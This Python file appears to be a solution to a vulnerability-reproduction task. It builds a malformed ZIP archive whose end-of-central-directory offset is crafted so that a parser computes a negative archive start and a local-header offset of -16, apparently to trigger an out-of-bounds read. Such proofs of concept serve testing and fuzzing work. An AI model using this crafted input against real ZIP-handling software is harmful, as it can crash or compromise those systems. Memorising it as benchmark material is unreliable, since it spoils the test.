import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a small ZIP-like input where the computed "archive start offset"
        # becomes negative due to inconsistent EOCD central directory offset/size.
        #
        # Layout:
        #   [Local File Header + name] [Central Directory File Header + name] [EOCD]
        #
        # Choose EOCD.cd_offset so that:
        #   archive_start = eocd_pos - cd_size - cd_offset = -16
        # while the physical central directory starts where we place it.
        #
        # Then the central directory's "relative offset of local header" = 0 causes
        # absolute local header offset = archive_start + 0 = -16.
        name = b"a"

        # Local File Header (30 bytes + name)
        lfh = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # signature
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method
            0,           # last mod file time
            0,           # last mod file date
            0,           # crc32
            0,           # compressed size
            0,           # uncompressed size
            len(name),   # file name length
            0,           # extra field length
        ) + name

        cd_start = len(lfh)

        # Central Directory File Header (46 bytes + name)
        cdfh = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,  # signature
            20,          # version made by
            20,          # version needed to extract
            0,           # general purpose bit flag
            0,           # compression method
            0,           # last mod file time
            0,           # last mod file date
            0,           # crc32
            0,           # compressed size
            0,           # uncompressed size
            len(name),   # file name length
            0,           # extra field length
            0,           # file comment length
            0,           # disk number start
            0,           # internal file attributes
            0,           # external file attributes
            0,           # relative offset of local header (malicious w/ negative archive_start)
        ) + name

        cd_size = len(cdfh)
        eocd_pos = cd_start + cd_size

        # Force archive_start to be -16:
        # archive_start = eocd_pos - cd_size - cd_offset = -16  => cd_offset = eocd_pos - cd_size + 16 = cd_start + 16
        cd_offset = cd_start + 16

        # End of Central Directory (22 bytes)
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # signature
            0,           # number of this disk
            0,           # number of the disk with the start of the central directory
            1,           # total number of entries in the central dir on this disk
            1,           # total number of entries in the central dir
            cd_size,     # size of the central directory
            cd_offset,   # offset of start of central directory w.r.t archive start (crafted)
            0,           # ZIP file comment length
        )

        return lfh + cdfh + eocd